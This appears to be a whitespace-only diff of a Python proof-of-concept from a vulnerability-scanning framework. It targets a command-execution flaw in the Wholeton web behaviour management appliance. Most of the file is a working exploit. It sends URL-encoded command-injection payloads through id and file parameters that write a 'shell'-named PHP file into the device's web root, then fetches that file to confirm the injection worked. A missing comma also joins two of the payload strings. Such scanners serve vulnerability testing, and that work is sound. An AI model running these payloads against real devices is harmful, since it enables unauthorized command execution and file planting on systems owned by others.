@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 import urllib
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Wholeton_0003' # 平台漏洞编号，留空
+    vuln_id = 'Wholeton_0003'  # 平台漏洞编号，留空
     name = '惠尔顿上网行为管理系统命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-03-26'  # 漏洞公布时间
     desc = '''
         惠尔顿（Wholeton）上网行为管理系统多处命令执行漏洞：
@@ -24,6 +25,7 @@ class Vuln(ABVuln):
     product = '惠尔顿上网行为管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '8c52ee21-c2e9-4158-9168-e0317b250ce7'
     author = '47bwy'  # POC编写者
@@ -36,17 +38,18 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            hh = hackhttp.hackhttp()       
-            #No.3 http://www.wooyun.org/bugs/wooyun-2010-0103676
+
+            hh = hackhttp.hackhttp()
+            # No.3 http://www.wooyun.org/bugs/wooyun-2010-0103676
             payloads = [
                 "/base/tpl/delectSSLL.php?id=;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/"
                 "/base/vpn/download_nodes.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
-                "/base/tpl/delectSSL.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
-                "/base/user/clearScreenImg.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
+                "/base/tpl/delectSSL.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
+                "/base/user/clearScreenImg.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
             ]
             for payload in payloads:
-                filename = 'shell' + str(random.randint(1,10000000000)) + '.php'
+                filename = 'shell' + \
+                    str(random.randint(1, 10000000000)) + '.php'
                 target = self.target + payload + filename
                 code, head, body, errcode, final_url = hh.http(target)
                 if code == 404:
@@ -64,6 +67,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
